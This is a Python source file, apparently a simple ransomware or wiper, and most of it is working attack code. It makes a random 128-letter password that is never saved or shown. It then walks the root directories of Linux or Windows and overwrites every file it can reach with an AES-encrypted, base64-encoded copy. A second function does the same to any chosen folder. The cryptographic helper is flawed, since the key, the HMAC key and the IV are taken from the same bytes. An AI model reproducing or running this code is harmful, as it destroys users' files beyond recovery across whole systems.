import base64
import hashlib
from aes import *
from Crypto.Protocol.KDF import PBKDF2
import string , random , sys
from sys import platform
import os
from hashlib import pbkdf2_hmac
from hmac import new as new_hmac, compare_digest

AES_KEY_SIZE = 16
HMAC_KEY_SIZE = 16
IV_SIZE = 16

SALT_SIZE = 16
HMAC_SIZE = 32

BLOCK_SIZE = 16
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE).encode()
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

def get_key_iv(password, salt, workload=100000):

    stretched = pbkdf2_hmac('sha256', password, salt, workload, AES_KEY_SIZE + IV_SIZE + HMAC_KEY_SIZE)
    aes_key, rest = stretched[:AES_KEY_SIZE], stretched[AES_KEY_SIZE:]
    hmac_key, rest = stretched[:HMAC_KEY_SIZE], stretched[HMAC_KEY_SIZE:]
    iv = stretched[:IV_SIZE]
    return aes_key, hmac_key, iv

def encrypt(key, plaintext, workload=100000):

    if isinstance(key, str):
        key = key.encode('utf-8')
    if isinstance(plaintext, str):
        plaintext = plaintext.encode('utf-8')

    salt = os.urandom(SALT_SIZE)
    key, hmac_key, iv = get_key_iv(key, salt, workload)
    ciphertext = AES(key).cbc(plaintext, iv)
    hmac = new_hmac(hmac_key, salt + ciphertext, 'sha256').digest()
    assert len(hmac) == HMAC_SIZE

    return hmac + salt + ciphertext

def password():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(128))

key = password()

def encrypt_bytecode(raw, password):
    txt = pad(raw)
    return base64.b64encode(encrypt(password, txt*1000))

def encrypt_system():
    if platform == "linux" or platform == "linux2":
            directories = next(os.walk('/'))[1]
            for core in ('proc', 'sys', 'lib', 'run'):
                directories.remove(core)
            for enc in range(0, len(directories)):
                files = os.listdir(f"/{directories[enc]}/")
                for i in range(len(files)):
                    if os.path.isfile(os.path.join(f'/{directories[enc]}/', f'{files[i]}')):
                        try:
                            with open(os.path.join(f'/{directories[enc]}/', f'{files[i]}') , 'rb') as targets:
                                f = targets.read()
                                aes = encrypt_bytecode(f, key)
                                print(f"Encrypting /{directories[enc]}/{files[i]}...")
                            with open(os.path.join(f'/{directories[enc]}/', f'{files[i]}') , 'wb') as encrypted:
                                encrypted.write(aes)
                        except Exception as e:
                               print(e)

    elif platform == "win32":
        directories = next(os.walk('C:/'))[1]
        for core in ('Documents and Settings', 'System Volume Information','PerfLogs'):
                directories.remove(core)
        for enc in range(0, len(directories)):
                files = os.listdir(f"C:/{directories[enc]}")
                for i in range(len(files)):
                    if os.path.isfile(os.path.join(f'C:/{directories[enc]}/', f'{files[i]}')):
                        try:
                            with open(os.path.join(f'C:/{directories[enc]}/', f'{files[i]}') , 'rb') as targets:
                                f = targets.read()
                                aes = encrypt_bytecode(f, key)
                                print(f"Encrypting C:/{directories[enc]}/{files[i]}...")
                            with open(os.path.join(f'C:/{directories[enc]}/', f'{files[i]}') , 'wb') as encrypted:
                                encrypted.write(aes)
                        except Exception as e:
                               print(e)
    else:
        print(f"Program is not made for {platform}")

def encrypt_folder(dirs):

    if platform == "linux" or platform == "linux2":
        directories = next(os.walk(dirs))[1]
        if directories == "/":
            for core in ('proc', 'sys', 'lib', 'run'):
                directories.remove(core)
        for enc in range(0, len(directories)):
                files = os.listdir(f"{dirs}/{directories[enc]}/")
                for i in range(len(files)):
                    if os.path.isfile(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}')):
                        try:
                            with open(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}') , 'rb') as targets:
                                f = targets.read()
                                aes = encrypt_bytecode(f, key)
                                print(f"Encrypting {dirs}/{directories[enc]}/{files[i]}...")
                            with open(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}') , 'wb') as encrypted:
                                encrypted.write(aes)
                        except Exception as e:
                               print(e)
                    else:
                        print("There are no encryptable files in the selected folder")
            
    elif platform == "win32":
        directories = next(os.walk(dirs))[1]
        for enc in range(0, len(directories)):
                files = os.listdir(f"{dirs}/{directories[enc]}/")
                for i in range(len(files)):
                    if os.path.isfile(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}')):
                        try:
                            with open(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}') , 'rb') as targets:
                                f = targets.read()
                                aes = encrypt_bytecode(f, key)
                                print(f"Encrypting {dirs}/{directories[enc]}/{files[i]}...")
                            with open(os.path.join(f'{dirs}/{directories[enc]}/', f'{files[i]}') , 'wb') as encrypted:
                                encrypted.write(aes)
                        except Exception as e:
                               print(e)
    else:
        print(f"Program is not made for {platform}")
